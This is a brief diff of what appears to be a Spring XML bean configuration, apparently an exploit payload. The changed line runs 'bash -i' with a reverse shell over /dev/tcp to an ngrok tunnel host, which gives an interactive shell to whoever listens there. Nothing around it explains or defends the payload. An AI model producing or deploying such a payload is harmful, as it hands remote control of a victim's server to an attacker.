@@ -8,7 +8,7 @@
             <list>
                 <value>bash</value>
                 <value>-c</value>
-                <value><![CDATA[bash -i >& /dev/tcp//4444 0>&1]]></value>
+                <value><![CDATA[bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/12738 0>&1]]></value>
             </list>
             </constructor-arg>
         </bean>
